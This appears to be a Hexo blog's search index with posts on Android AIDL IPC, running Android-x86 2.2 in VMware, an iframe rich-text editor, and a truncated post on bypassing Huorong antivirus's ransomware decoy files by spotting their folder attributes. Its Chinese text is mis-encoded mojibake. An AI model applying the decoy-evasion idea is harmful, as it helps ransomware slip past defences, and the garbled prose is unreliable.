{"pages":[],"posts":[{"title":"åœ¨Androidä¸­ä½¿ç”¨AIDLå®ç°è¿›ç¨‹é—´é€šä¿¡","text":"åœ¨Androidä¸­ï¼Œå¯ä»¥ä½¿ç”¨AIDLï¼ˆThe Android Interface Definition Languageï¼Œå®‰å“æ¥å£å®šä¹‰è¯­è¨€ï¼‰å®ç°è¿›ç¨‹é—´é€šä¿¡ã€‚æœ¬æ–‡è®°å½•äº†ä½¿ç”¨AIDLå®ç°è¿›ç¨‹é—´é€šä¿¡çš„æ–¹æ³•ã€‚ Androidå®˜æ–¹ç»™çš„AIDLæ–‡æ¡£åœ°å€ï¼š https://developer.android.com/guide/components/aidl å¼€å‘å·¥å…·Android Studio Giraffe | 2022.3.1 Patch 1 åˆ›å»ºé¡¹ç›®ä½¿ç”¨Android Studioåˆ›å»ºä¸¤ä¸ªAPPé¡¹ç›®ï¼Œåˆ†åˆ«å‘½åä¸ºAIDLServerå’ŒAIDLClientï¼Œæ¨¡æ¿å‡é€‰æ‹©Empty Views Activityï¼š ç¼–ç¨‹ç›®æ ‡é€šè¿‡AIDLå®ç°è¿›ç¨‹é—´é€šä¿¡ï¼Œè®©AIDLClientè·å–åˆ°AIDLServerçš„è¿›ç¨‹IDã€‚ é¦–å…ˆç¼–å†™AIDLServerçš„ä»£ç ï¼Œåœ¨AIDLServerç•Œé¢ä¸Šæ‰“å°AIDLServerçš„è¿›ç¨‹IDã€‚ åœ¨activity_main.xmlä¸­ä¸ºä¸­é—´çš„Hello World!å­—ç¬¦ä¸²æ·»åŠ IDï¼Œç„¶ååœ¨MainActivity.javaçš„onCreateä¸­è®©å…¶æ‰“å°AIDLServerçš„è¿›ç¨‹IDï¼š ç¼–è¯‘è¿è¡ŒAPPï¼ŒAIDLServeråœ¨æœ¬æ¬¡è¿è¡Œçš„è¿›ç¨‹IDä¸º2820ï¼š ç¼–å†™AIDLæ¥å£ç”±å®˜æ–¹æ–‡æ¡£å¯çŸ¥ï¼Œä½¿ç”¨AIDLåˆ›å»ºæœåŠ¡åŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š åˆ›å»ºaidlæ–‡ä»¶ å®ç°æ¥å£ å°†æ¥å£æš´éœ²ç»™client åˆ›å»ºaidlæ–‡ä»¶æ–‡æ¡£ä¸­è¯´ï¼Œéœ€è¦å°†aidlæ–‡ä»¶ä¿å­˜åœ¨src/æ–‡ä»¶å¤¹ä¸‹ï¼Œbuildé¡¹ç›®æ—¶ï¼ŒSDKå·¥å…·ä¼šåœ¨gen/è·¯å¾„ä¸‹è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªjavaæ–‡ä»¶ï¼Œæ–‡ä»¶åä¸aidlæ–‡ä»¶ç›¸åŒã€‚ åœ¨Android Studioå·¦ä¾§Projectæ ä¸­ï¼Œå³é”®src/è·¯å¾„ï¼Œé€‰æ‹©æ–°å»ºaidlæ–‡ä»¶ï¼Œå‘½åä¸ºIRemoteService.aidlã€‚å¦‚æœæç¤ºRequires setting the buildFeatures.aidl to true in the build fileï¼Œå¯ä»¥ç¼–è¾‘app/è·¯å¾„ä¸‹çš„build.gradle.ktsæ–‡ä»¶ï¼Œåœ¨android{...}ä¸­æ·»åŠ buildFeatures.aidl = trueï¼Œå¹¶Sync Project with Gradle Filesï¼š ä¼šå‘ç°IRemoteService.aidlçš„è·¯å¾„ä¸ºsrc/main/aidl/åŒ…å/ï¼š AIDLæ–‡ä»¶çš„å†…å®¹åŸºæœ¬å¯ä»¥ç…§æŠ„æ–‡æ¡£ï¼š 12345678910111213141516// IRemoteService.aidlpackage com.example.aidlserver;// Declare any non-default types here with import statements/** Example service interface */interface IRemoteService { /** Request the process ID of this service. */ int getPid(); /** Demonstrates some basic types that you can use as parameters * and return values in AIDL. */ void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString);} buildé¡¹ç›®åï¼Œå¯åœ¨build/generated/aidl_source_output_dir/debug/out/åŒ…å/è·¯å¾„ä¸‹æ‰¾åˆ°IRemoteService.javaæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹éå¸¸å¤æ‚ã€‚ å®ç°æ¥å£å¹¶å°†æ¥å£æš´éœ²ç»™clientæ–‡æ¡£ä¸­ç»™å‡ºçš„ç¤ºä¾‹ï¼Œä½¿ç”¨åŒ¿åç±»æ‰©å±•IRemoteService.javaä¸­çš„IRemoteService.Stubç±»ï¼Œå¹¶å®ç°äº†getPidæ–¹æ³•ï¼š 123456789private final IRemoteService.Stub binder = new IRemoteService.Stub() { public int getPid(){ return Process.myPid(); } public void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString) { // Does nothing. }}; å…³äºJavaåŒ¿åç±»å¯å‚è€ƒï¼šhttps://www.runoob.com/java/java-anonymous-class.html æš´éœ²æ¥å£çš„æ–¹æ³•æ˜¯ï¼šæ‰©å±•Serviceç±»ï¼Œå¹¶å®ç°å…¶ä¸­çš„onBindæ–¹æ³•ï¼Œè®©onBindè¿”å›IRemoteService.Stubç±»çš„å®ä¾‹binderã€‚ åœ¨APPçš„é¡¹ç›®ä¸­ï¼Œsrc/main/java/åŒ…å/ä¸‹ï¼Œæ–°å»ºä¸€ä¸ªRemoteServiceç±»RemoteService.javaï¼Œå…¶å†…å®¹å¯ç›´æ¥ç…§æŠ„æ–‡æ¡£ï¼š 1234567891011121314151617181920212223242526272829package com.example.aidlserver;import android.app.Service;import android.content.Intent;import android.os.IBinder;import android.os.Process;public class RemoteService extends Service { @Override public void onCreate() { super.onCreate(); } @Override public IBinder onBind(Intent intent) { // Return the interface. return binder; } private final IRemoteService.Stub binder = new IRemoteService.Stub() { public int getPid(){ return Process.myPid(); } public void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString) { // Does nothing. } };} åœ¨manifestä¸­å£°æ˜serviceä»£ç ç¼–å†™å®Œæˆåï¼Œè¿˜éœ€è¦ç¼–è¾‘AndroidManifest.xmlï¼Œåœ¨&lt;application&gt;çš„tagä¸­æ·»åŠ &lt;service&gt;ï¼Œå£°æ˜RemoteServiceè¿™ä¸ªæœåŠ¡ã€‚ 12345678910&lt;application ...&gt; &lt;activity android:name=&quot;.MainActivity&quot; android:exported=&quot;true&quot;&gt; ... &lt;/activity&gt; &lt;service android:name=&quot;.RemoteService&quot; android:exported=&quot;true&quot;/&gt;&lt;/application&gt; æ³¨æ„serviceçš„tagé‡Œé¢éœ€è¦æ·»åŠ android:exported=&quot;true&quot;å±æ€§ã€‚ ä¹‹åå³å¯ç¼–è¯‘å¹¶è¿è¡ŒAPPã€‚ å®¢æˆ·ç«¯è°ƒç”¨IPCæ–¹æ³•å®˜æ–¹æ–‡æ¡£ä¸­è¯´ï¼Œå¦‚æœclientå’Œserviceè¿è¡Œåœ¨ä¸åŒçš„APPä¸­ï¼Œé‚£ä¹ˆclientçš„src/æ–‡ä»¶å¤¹ä¸­éœ€è¦æœ‰AIDLæ–‡ä»¶çš„æ‹·è´ã€‚å¯ä»¥ç›´æ¥å°†AIDLServiceçš„src/main/aidlæ–‡ä»¶å¤¹å¤åˆ¶åˆ°AIDLClienté¡¹ç›®çš„src/mainè·¯å¾„ä¸‹ã€‚å¤åˆ¶å®Œæˆåï¼ŒAIDLClientçš„æ–‡ä»¶ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¦å¤–ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯ç‰ˆæœ¬è¾ƒæ–°çš„Android Studioï¼Œåˆ™å’Œå‰é¢çš„AIDLServerç›¸åŒï¼Œä¹Ÿè¦ç¼–è¾‘app/è·¯å¾„ä¸‹çš„build.gradle.ktsæ–‡ä»¶ï¼Œåœ¨android{...}ä¸­æ·»åŠ buildFeatures.aidl = trueã€‚ æ­¤æ—¶build AIDLClienté¡¹ç›®ï¼Œå³å¯åœ¨build/generated/aidl_source_output_dir/debug/out/com.example.aidlserver/ä¸‹çœ‹åˆ°IRemoteService.javaã€‚ åœ¨AIDLClientçš„src/main/java/MainActivity.javaä¸­ï¼Œå®ç°ServiceConnectionç±»ï¼Œè¿™é‡Œå¯ä»¥ä»¿ç…§æ–‡æ¡£ä¸­çš„ç¤ºä¾‹ï¼Œåœ¨MainActivityä¸­ç”¨åŒ¿åç±»çš„æ–¹æ³•å®ç°ï¼Œå¹¶åœ¨ServiceConnectionçš„onServiceConnectedæ–¹æ³•ä¸­ï¼Œè°ƒç”¨IRemoteService.Stub.asInterface(service)ï¼Œå°†serviceè½¬æ¢æˆIRemoteServiceç±»å‹ã€‚ 12345678910111213141516171819202122232425import com.example.aidlserver.IRemoteService;public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { ... } /** The primary interface we are calling on the service. */ IRemoteService mService = null; /** * Class for interacting with the main interface of the service. */ private ServiceConnection mConnection = new ServiceConnection() { public void onServiceConnected(ComponentName className, IBinder service) { mService = IRemoteService.Stub.asInterface(service); } public void onServiceDisconnected(ComponentName className) { mService = null; } };} æ¥ä¸‹æ¥ï¼Œåœ¨onCreateä¸­è°ƒç”¨bindServiceï¼Œä¼ å…¥å®ç°çš„ServiceConnectionï¼Œæ–‡æ¡£ä¸­ç»™çš„ç¤ºä¾‹æ˜¯ï¼š 123Intent intent = new Intent(Binding.this, RemoteService.class);intent.setAction(IRemoteService.class.getName());bindService(intent, mConnection, Context.BIND_AUTO_CREATE); ä½†æ˜¯åœ¨å®é™…ç¼–å†™AIDLClientçš„ä»£ç æ—¶ï¼Œé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šRemoteServiceè¿™ä¸ªç±»æ˜¯åœ¨AIDLServerä¸­ç¼–å†™çš„ï¼ŒAIDLClienté‡Œé¢æ²¡æœ‰è¿™ä¸ªç±»ï¼Œæ‰€ä»¥æ²¡æ³•ä½¿ç”¨RemoteService.classè¿™ä¸ªå‚æ•°ã€‚ åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†è¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ³•ï¼šhttps://stackoverflow.com/a/55697742 åœ¨onCreateä¸­ç¼–å†™è¿™äº›ä»£ç ï¼š 12345678910@Overrideprotected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Intent intent = new Intent(); intent.setAction(IRemoteService.class.getName()); intent.setClassName(&quot;com.example.aidlserver&quot;, &quot;com.example.aidlserver.RemoteService&quot;); bindService(intent, mConnection, Context.BIND_AUTO_CREATE);} æœ€ååœ¨onServiceConnectedä¸­ï¼Œå³å¯è°ƒç”¨mService.getPidè·å–AIDLServerçš„è¿›ç¨‹IDã€‚MainActivity.javaçš„å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package com.example.aidlclient;import androidx.appcompat.app.AppCompatActivity;import android.content.ComponentName;import android.content.Context;import android.content.Intent;import android.content.ServiceConnection;import android.os.Bundle;import android.os.IBinder;import android.os.Process;import android.os.RemoteException;import android.widget.TextView;import com.example.aidlserver.IRemoteService;public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Intent intent = new Intent(); intent.setAction(IRemoteService.class.getName()); intent.setClassName(&quot;com.example.aidlserver&quot;, &quot;com.example.aidlserver.RemoteService&quot;); bindService(intent, mConnection, Context.BIND_AUTO_CREATE); } /** The primary interface we are calling on the service. */ IRemoteService mService = null; /** * Class for interacting with the main interface of the service. */ private ServiceConnection mConnection = new ServiceConnection() { public void onServiceConnected(ComponentName className, IBinder service) { // This is called when the connection with the service is // established, giving us the service object we can use to // interact with the service. We are communicating with our // service through an IDL interface, so get a client-side // representation of that from the raw service object. mService = IRemoteService.Stub.asInterface(service); if (mService != null) { try { String text = &quot;Service PID: &quot; + String.valueOf(mService.getPid()) + &quot;\\nClient PID: &quot; + Process.myPid(); TextView hello_world = (TextView) findViewById(R.id.hello_world); hello_world.setText(text); } catch (RemoteException e) { throw new RuntimeException(e); } } } public void onServiceDisconnected(ComponentName className) { // This is called when the connection with the service is // unexpectedly disconnected&amp;mdash;that is, its process crashed. mService = null; } };} è¿è¡Œç»“æœåœ¨Androidè®¾å¤‡ä¸Šå®‰è£…AIDLServerå’ŒAIDLClientï¼Œå…ˆåè¿è¡ŒAIDLServerå’ŒAIDLClientï¼Œå¯ä»¥å‘ç°AIDLClientæˆåŠŸè·å–åˆ°AIDLServerçš„è¿›ç¨‹IDï¼š","link":"/2023/09/08/android-aidl-ipc/"},{"title":"åœ¨VMware Workstationä¸­å®‰è£…X86ç‰ˆAndroid 2.2ï¼Œå¹¶è¿è¡Œ2010å¹´çš„å®‰å“æ¸¸æˆ","text":"åœ¨Redditä¸Šçœ‹åˆ°ä¸€ç¯‡å¸–å­ï¼Œå¸Œæœ›èƒ½æ‰¾åˆ°ä¸€ä¸ªè€ç‰ˆæœ¬çš„å®‰å“æ¨¡æ‹Ÿå™¨ï¼Œåœ¨ä¸Šé¢è¿è¡Œä¸€æ¬¾2010å¹´å·¦å³ï¼Œç”±å¹¿å·å¥¥å…¹è½¯ä»¶å…¬å¸åˆ¶ä½œçš„æ‰‹æœºæ¸¸æˆBattlegroundï¼Œä¸­æ–‡åç§°ä¸ºã€Šæˆ˜äº‰ä¹‹ç‹ã€‹ï¼Œè¯¥æ¸¸æˆæ— æ³•åœ¨Android 4.0+çš„ç³»ç»Ÿä¸Šè¿è¡Œã€‚ https://www.reddit.com/r/BlueStacks/comments/rgfl7z/question_old_version_of_android/ æœç´¢åæ‰¾åˆ°è¿™æ¬¾æ¸¸æˆçš„APKæ–‡ä»¶ï¼šhttps://www.androidout.com/item/android-apps/27008/battleground/ æˆ‘åœ¨VMwareÂ® Workstation 15 Proä¸Šå®‰è£…Android 2.2è™šæ‹Ÿæœºï¼Œåœ¨é‡Œé¢æˆåŠŸå®‰è£…å¹¶è¿è¡Œäº†è¿™æ¬¾æ¸¸æˆï¼Œä¸è¿‡æ²¡æ³•æ’­æ”¾æ¸¸æˆå£°éŸ³ï¼Œä½†æ˜¯ä¸å½±å“æ­£å¸¸æ¸¸ç©ã€‚ å®‰è£…Android 2.2è™šæ‹Ÿæœºä¸‹è½½Android-x86 2.2çš„ISOæ–‡ä»¶Android-x86 2.2çš„ISOæ–‡ä»¶ç”±Android-x86é¡¹ç›®æä¾›ï¼šhttps://www.android-x86.org/ ä¸‹è½½åœ°å€ï¼š https://sourceforge.net/projects/android-x86/files/Release%202.2/ ä¸‹è½½æ–‡ä»¶ï¼šandroid-x86-2.2-generic.iso åœ¨VMwareä¸­åˆ›å»ºè™šæ‹Ÿæœºæ–°å»ºè™šæ‹Ÿæœºï¼Œé€‰æ‹©å…¸å‹ï¼Œå®‰è£…ç¨‹åºå…‰ç›˜æ˜ åƒæ–‡ä»¶é€‰æ‹©android-x86-2.2-generic.iso å–æ¶ˆå‹¾é€‰â€œåˆ›å»ºåå¼€å¯æ­¤è™šæ‹Ÿæœºâ€ ç¼–è¾‘.vmxæ–‡ä»¶çš„etherneté€‰é¡¹æ‰“å¼€è™šæ‹Ÿæœºæ–‡ä»¶å¤¹ä¸‹çš„.vmxæ–‡ä»¶ï¼Œå°†è¿™é‡Œçš„ethernet0.virtualDevçš„e1000ä¿®æ”¹ä¸ºvlanceã€‚å¦‚æœæ–‡ä»¶ä¸­åŒ…å«ä¸­æ–‡ï¼Œè¿™ä¸€æ­¥éœ€è¦æ³¨æ„ç¼–ç é—®é¢˜ï¼Œé€šå¸¸è¯¥æ–‡ä»¶çš„ç¼–ç æ˜¯GB 2312ã€‚ å¯åŠ¨è™šæ‹Ÿæœºï¼Œå®‰è£…Androidç³»ç»Ÿå¯åŠ¨è™šæ‹Ÿæœºåè¿›å…¥è¿™ä¸ªé¡µé¢ï¼Œå¯ä»¥ä¸å®‰è£…ç³»ç»Ÿç›´æ¥Live CDè¿›å…¥ç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥å°†Android-x86è‡³ç¡¬ç›˜ã€‚ é€‰æ‹©Installationå®‰è£…ï¼Œå†æŒ‰ä¸€æ¬¡å›è½¦ï¼Œè¿›åˆ°è¿™é‡Œï¼š æ–¹å‘é”®å·¦å³å¯ä»¥é€‰æ‹©ï¼Œå›è½¦å¯ä»¥ç¡®è®¤ã€‚ä¾æ¬¡é€‰æ‹©ï¼šNew ğŸ‘‰ Primary ğŸ‘‰ Size (in MB): 10733.99ï¼ˆç›´æ¥å›è½¦ï¼‰ ğŸ‘‰ Bootable ğŸ‘‰ Write ğŸ‘‰ è¾“å…¥yesç„¶åå›è½¦ ğŸ‘‰ Quit è¿›åˆ°è¿™ä¸ªé¡µé¢ï¼Œé€‰ä¸­sda1åç›´æ¥å›è½¦ï¼š æ–¹å‘é”®ä¸‹ï¼Œé€‰ä¸­ext3ï¼Œç„¶åå›è½¦ï¼š åé¢ç›´æ¥å…¨éƒ¨å›è½¦å³å¯ã€‚å¦å¤–ï¼šåœ¨è¿™é‡Œæœ‰ä¸€ä¸ªCreate a fake SD cardåŠŸèƒ½ï¼Œæˆ‘è¯•è¿‡å‘ç°ï¼ŒAndroid 2.2çš„é•œåƒç”¨äº†è¿™ä¸ªåŠŸèƒ½åï¼Œä¼šå¯¼è‡´æ— æ³•å¼€æœºï¼Œä¸è¿‡åœ¨Android 2.3é•œåƒé‡Œè¿™ä¸ªåŠŸèƒ½ä¼¼ä¹æ˜¯æ­£å¸¸çš„ã€‚å› ä¸ºç›®å‰æ˜¯ç”¨çš„Android 2.2ï¼Œæ‰€ä»¥ç›´æ¥Run Android-x86ï¼š Android 2.3çš„é•œåƒå¯åœ¨è¿™é‡Œä¸‹è½½ï¼šhttps://code.google.com/archive/p/android-x86/downloads æ£€æŸ¥ç½‘ç»œè¿æ¥æ˜¯å¦æ­£å¸¸åœ¨è™šæ‹Ÿæœºä¸­ï¼ŒAlt+F1å¯è¿›å…¥å‘½ä»¤è¡Œç•Œé¢ï¼ŒAlt+F7å¯è¿”å›å›¾å½¢ç•Œé¢ã€‚ Alt+F1ä¹‹åï¼Œè¾“å…¥ip aå‘½ä»¤ï¼Œå¦‚æœç½‘ç»œæ­£å¸¸ï¼Œå¯ä»¥çœ‹åˆ°eth0ï¼Œä»¥åŠä¸‹é¢çš„IPåœ°å€ï¼Œæˆ‘è¿™é‡Œçš„IPåœ°å€æ˜¯192.168.163.154ã€‚ ç½‘ç»œæ­£å¸¸æ—¶å¯ä»¥pingé€šbaidu.comï¼š å¦‚æœç½‘ç»œæœ‰é—®é¢˜ï¼Œå¹¶ä¸”åªèƒ½çœ‹åˆ°loï¼Œçœ‹ä¸åˆ°eth0ï¼Œåˆ™éœ€è¦æ£€æŸ¥ä¹‹å‰çš„.vmxæ–‡ä»¶ä¸­ethernet0.virtualDevæ˜¯å¦å·²ç»ä¿®æ”¹ä¸ºäº†vlanceã€‚å¦‚æœçœ‹åˆ°äº†eth0ï¼Œä½†æ˜¯æ²¡æœ‰IPåœ°å€ï¼Œç½‘ç»œä¹Ÿè¿ä¸ä¸Šï¼Œåˆ™å¯ä»¥å‚è€ƒè¿™é‡Œçš„è§£å†³æ–¹æ³•ï¼š Solve Android x86 No Network Problems in VMware Workstation | virten.net ä¹Ÿå°±æ˜¯è¿è¡Œä¸‹é¢ä¸¤æ¡å‘½ä»¤ï¼š 12setprop net.dns1 8.8.8.8dhcpcd eth0 å¦‚æœç½‘ç»œæ­£å¸¸ï¼Œé‚£ä¹ˆè®°ä½eth0çš„è¿™ä¸ªIPåœ°å€ã€‚ç„¶åï¼ŒAlt+F7è¿”å›å›¾å½¢ç•Œé¢ã€‚ adbè¿æ¥Androidè™šæ‹Ÿæœºå¹¶å®‰è£…apkæ–‡ä»¶åœ¨Windowså®¿ä¸»æœºä¸­ï¼Œä½¿ç”¨adbé€šè¿‡IPåœ°å€è¿æ¥åˆ°Androidè™šæ‹Ÿæœºï¼Œå‘½ä»¤ä¸ºadb connect [IPåœ°å€]ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œçš„IPåœ°å€æ˜¯192.168.163.154ï¼Œé‚£ä¹ˆè¿æ¥å‘½ä»¤ä¸ºadb connect 192.168.163.154ï¼š 123456&gt; adb connect 192.168.163.154connected to 192.168.163.154:5555&gt; adb devicesList of devices attached192.168.163.154:5555 device ä¹‹åï¼Œå†cdåˆ°apkæ‰€åœ¨è·¯å¾„ï¼Œç”¨adb installå®‰è£…APPï¼š 12345&gt; adb install battleground.apkPerforming Push Installbattleground.apk: 1 file pushed, 0 skipped. 10.7 MB/s (11615871 bytes in 1.031s) pkg: /data/local/tmp/battleground.apkSuccess ç°åœ¨å°±èƒ½åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œè¯¥æ¸¸æˆäº†ï¼š","link":"/2024/02/16/android-x86-2-2-battleground/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2021/01/12/hello-world/"},{"title":"è®¾ç½®iframeä¸­bodyçš„contentEditableå±æ€§","text":"åœ¨HTMLä¸­ï¼Œå®ç°å¯Œæ–‡æœ¬/æ‰€è§å³æ‰€å¾—ç¼–è¾‘å™¨çš„ä¸€ç§æ–¹æ³•æ˜¯å°†iframeä¸­bodyçš„contentEditableå±æ€§è®¾ç½®ä¸ºtrueã€‚QQé‚®ç®±çš„å†™ä¿¡åŠŸèƒ½å°±ä½¿ç”¨äº†è¿™ä¸€åŸç†ï¼š è·å–iframeä¸­bodyçš„æ–¹æ³•å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ï¼š html - How to get the body's content of an iframe in Javascript? - Stack Overflow ç¼–å†™JSä»£ç ï¼Œå°†contentEditableè®¾ç½®ä¸ºtrueï¼š 123var iframe = document.getElementById(&quot;ifrm&quot;);var iframeDocument = iframe.contentDocument || iframe.contentWindow.document;iframeDocument.body.contentEditable = &quot;true&quot;; è¿™æ®µJSä»£ç éœ€è¦åœ¨iframeåŠ è½½ä¹‹åæ‰§è¡Œï¼Œå¯ä»¥å°†å…¶æ”¾åœ¨window.onloadå½“ä¸­: 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;script&gt; window.onload = function() { var iframe = document.getElementById(&quot;ifrm&quot;); var iframeDocument = iframe.contentDocument || iframe.contentWindow.document; iframeDocument.body.contentEditable = &quot;true&quot;; } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;iframe id=&quot;ifrm&quot; width=1000 height=500&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; document.onloadå’Œwindow.onloadçš„åŒºåˆ«æ˜¯ï¼šdocument.onloadä¼šåœ¨DOMåŠ è½½åã€å›¾ç‰‡ç­‰å¤–éƒ¨èµ„æºåŠ è½½å‰è§¦å‘ï¼Œwindow.onloadåœ¨æ•´ä¸ªé¡µé¢ï¼ˆåŒ…æ‹¬CSSæ–‡ä»¶ã€è„šæœ¬æ–‡ä»¶ã€å›¾ç‰‡ç­‰ï¼‰åŠ è½½åæ‰ä¼šè§¦å‘ã€‚ ç°åœ¨æ‰“å¼€é¡µé¢ï¼Œå°±ä¼šå‡ºç°ä¸€ä¸ªæ¡†ï¼Œå¯ä»¥å‘æ¡†ä¸­ç²˜è´´ä¸€äº›æœ‰æ ·å¼çš„æ–‡æœ¬ã€‚ æ¥ä¸‹æ¥ï¼Œå†ç»™é¡µé¢æ·»åŠ ä¸€ä¸ªæŒ‰é’®ï¼Œç”¨æˆ·ç‚¹å‡»æŒ‰é’®å‘ç½‘é¡µæäº¤è¾“å…¥çš„æ–‡æœ¬ã€‚å¯ä»¥æ„é€ ä¸€ä¸ªè¡¨å•ï¼š 12345&lt;form action=https://httpbin.org/post method=post&gt; &lt;iframe id=&quot;ifrm&quot; width=1000 height=500&gt;&lt;/iframe&gt; &lt;input type=hidden name=&quot;iframe&quot; id=&quot;ifrmcontent&quot;&gt; &lt;input type=submit&gt;&lt;/form&gt; ç”¨æˆ·æäº¤è¡¨å•æ—¶ï¼Œæ‰§è¡Œä¸€æ®µJSä»£ç ï¼Œå°†iframeçš„å†…å®¹å¤åˆ¶ç»™ä¸‹é¢çš„input hiddenã€‚å®ç°è¿™ä¸€åŠŸèƒ½çš„JSä»£ç ä¸ºï¼š 12345function copyIfrm2Hidden() { var iframe = document.getElementById(&quot;ifrm&quot;); var iframeDocument = iframe.contentDocument || iframe.contentWindow.document; document.getElementById(&quot;ifrmcontent&quot;).value = iframeDocument.body.innerHTML;} è®¾ç½®formçš„onsubmitå±æ€§ï¼Œåœ¨æäº¤è¡¨å•æ—¶æ‰§è¡ŒcopyIfrm2Hiddenå‡½æ•°ï¼š 12345&lt;form action=https://httpbin.org/post method=post onsubmit=&quot;copyIfrm2Hidden()&quot;&gt; &lt;iframe id=&quot;ifrm&quot; width=1000 height=500&gt;&lt;/iframe&gt; &lt;input type=hidden name=&quot;iframe&quot; id=&quot;ifrmcontent&quot;&gt; &lt;input type=submit&gt;&lt;/form&gt; å®Œæ•´ä»£ç ä¸ºï¼š 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;script&gt; function copyIfrm2Hidden() { var iframe = document.getElementById(&quot;ifrm&quot;); var iframeDocument = iframe.contentDocument || iframe.contentWindow.document; document.getElementById(&quot;ifrmcontent&quot;).value = iframeDocument.body.innerHTML; } window.onload = function() { var iframe = document.getElementById(&quot;ifrm&quot;); var iframeDocument = iframe.contentDocument || iframe.contentWindow.document; iframeDocument.body.contentEditable = &quot;true&quot;; } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=https://httpbin.org/post method=post onsubmit=&quot;copyIfrm2Hidden()&quot;&gt; &lt;iframe id=&quot;ifrm&quot; width=1000 height=500&gt;&lt;/iframe&gt; &lt;input type=hidden name=&quot;iframe&quot; id=&quot;ifrmcontent&quot;&gt; &lt;input type=submit&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹å¼æäº¤è¯·æ±‚ï¼Œæ¯”å¦‚å¾ˆå¤šé‚®ç®±éƒ½ä½¿ç”¨XMLHttpRequestçš„æ–¹å¼å‘é€é‚®ä»¶ã€‚","link":"/2022/01/23/html-iframe-body-contenteditable/"},{"title":"ç»•è¿‡ç«ç»’å‹’ç´¢ç—…æ¯’è¯±æ•åŠŸèƒ½çš„ä¸€ç§æ–¹æ³•","text":"ç«ç»’çš„è®¾ç½®ä¸­å¯ä»¥å‹¾é€‰å¼€å¯å‹’ç´¢ç—…æ¯’è¯±æ•åŠŸèƒ½ï¼Œå¼€å¯åï¼Œç«ç»’ä¼šåœ¨Cç›˜åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œé¢åŒ…å«ä¸€äº›è¯±é¥µæ–‡ä»¶ã€‚å½“å‹’ç´¢è½¯ä»¶å¯¹è¿™äº›è¯±é¥µæ–‡ä»¶åŠ å¯†æ—¶ï¼Œå°±ä¼šè¢«ç«ç»’æ‹¦æˆªã€‚ https://bbs.huorong.cn/thread-22817-1-1.html è¿™ä¸¤ä¸ªæ–‡ä»¶å¤¹çš„å±æ€§ä¸æ™®é€šçš„ç”¨æˆ·æ–‡ä»¶å¤¹ä¸åŒã€‚å‹’ç´¢è½¯ä»¶å¦‚æœåªéœ€è¦åŠ å¯†æ™®é€šçš„ç”¨æˆ·æ–‡ä»¶å¤¹ï¼Œåˆ™åªç”¨è¿›è¡Œä¸€äº›ç®€å•çš„åˆ¤æ–­å°±èƒ½è¯†åˆ«å¹¶é¿å¼€è¿™äº›è¯±é¥µæ–‡ä»¶äº†ã€‚ ç«ç»’åˆ›å»ºçš„ä¸¤ä¸ªæ–‡ä»¶å¤¹åœ¨Cç›˜ä¸­æ‰§è¡Œdir /Aå¯ä»¥æŸ¥çœ‹æ‰€æœ‰è¢«éšè—çš„æ–‡ä»¶å¤¹ï¼š 1234567891011121314151617181920212223242526C:\\&gt;dir /A é©±åŠ¨å™¨ C ä¸­çš„å·æ²¡æœ‰æ ‡ç­¾ã€‚ å·çš„åºåˆ—å·æ˜¯ D227-C50D C:\\ çš„ç›®å½•2021/09/08 20:52 &lt;DIR&gt; program6942021/09/08 20:37 &lt;DIR&gt; $Recycle.Bin2021/09/09 10:43 &lt;DIR&gt; $WinREAgent2019/12/07 17:08 413,738 bootmgr2019/12/07 17:08 1 BOOTNXT2021/07/29 19:06 &lt;JUNCTION&gt; Documents and Settings [C:\\Users]2021/07/29 19:14 8,192 DumpStack.log.tmp2021/07/29 19:14 2,013,265,920 pagefile.sys2019/12/07 17:14 &lt;DIR&gt; PerfLogs2021/09/09 10:56 &lt;DIR&gt; Program Files2021/09/08 20:52 &lt;DIR&gt; Program Files (x86)2021/09/08 20:52 &lt;DIR&gt; ProgramData2021/07/29 19:06 &lt;DIR&gt; Recovery2021/07/29 19:14 16,777,216 swapfile.sys2021/09/08 20:52 &lt;DIR&gt; System Volume Information2021/07/29 19:14 &lt;DIR&gt; Users2021/09/08 20:45 &lt;DIR&gt; Windows2021/09/08 20:52 &lt;DIR&gt; Zsetup287 5 ä¸ªæ–‡ä»¶ 2,030,465,067 å­—èŠ‚ 13 ä¸ªç›®å½• 3,322,830,848 å¯ç”¨å­—èŠ‚ 